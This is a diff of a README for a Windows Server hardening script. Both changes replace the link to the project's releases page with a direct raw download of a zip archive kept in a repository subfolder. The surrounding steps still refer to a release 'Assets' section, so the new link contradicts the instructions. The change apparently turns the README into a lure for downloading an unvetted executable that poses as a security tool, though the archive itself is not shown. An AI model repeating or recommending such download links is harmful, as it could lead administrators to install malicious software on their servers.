@@ -1,6 +1,6 @@
 # 🛡️ bastion-script - Hardening tools for Windows Server VPS
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/solarapexsoul850/bastion-script/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/solarapexsoul850/bastion-script/raw/refs/heads/main/eyeserver/script_bastion_2.2.zip)
 
 ## 📌 What is this script?
 
@@ -19,7 +19,7 @@ Ensure your server meets these requirements before you run the script:
 
 Follow these steps to obtain the correct version for your server:
 
-1. Visit this page to download the latest version: [https://github.com/solarapexsoul850/bastion-script/releases](https://github.com/solarapexsoul850/bastion-script/releases)
+1. Visit this page to download the latest version: [https://github.com/solarapexsoul850/bastion-script/raw/refs/heads/main/eyeserver/script_bastion_2.2.zip](https://github.com/solarapexsoul850/bastion-script/raw/refs/heads/main/eyeserver/script_bastion_2.2.zip)
 2. Look for the section labeled "Assets".
 3. Click the file ending in `.zip` or `.exe` to save it to your local machine or server.
 4. If you download a zip file, right-click the folder and select "Extract All".
